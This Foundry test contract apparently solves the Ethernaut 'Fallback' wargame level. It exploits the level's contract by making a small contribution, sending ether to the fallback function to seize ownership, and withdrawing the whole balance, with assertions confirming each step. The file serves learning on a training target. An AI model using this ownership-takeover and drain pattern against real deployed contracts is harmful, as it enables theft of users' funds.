// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Fallback.sol";

contract TestFallback is Test {
    Fallback _fallback;
    address user = address(0x51);
    address deployer = address(0x52);

    function setUp() external {
        vm.startPrank(deployer);
        _fallback = new Fallback();
        vm.deal(user, 100 ether);
        vm.deal(address(_fallback), 10000 ether);
        vm.stopPrank();
    }

    function testExploit() external {
        vm.startPrank(user);
        assertEq(_fallback.owner(), deployer);
        // become a contributor by adding some balance
        _fallback.contribute{value: 0.0001 ether}();
        // become the owner by calling the fallback fn
        address(_fallback).call{value: 1 ether}("");
        assertEq(_fallback.owner(), user);
        assertTrue(address(_fallback).balance > 0);
        _fallback.withdraw();
        assertEq(address(_fallback).balance, 0);
        vm.stopPrank();
    }
}
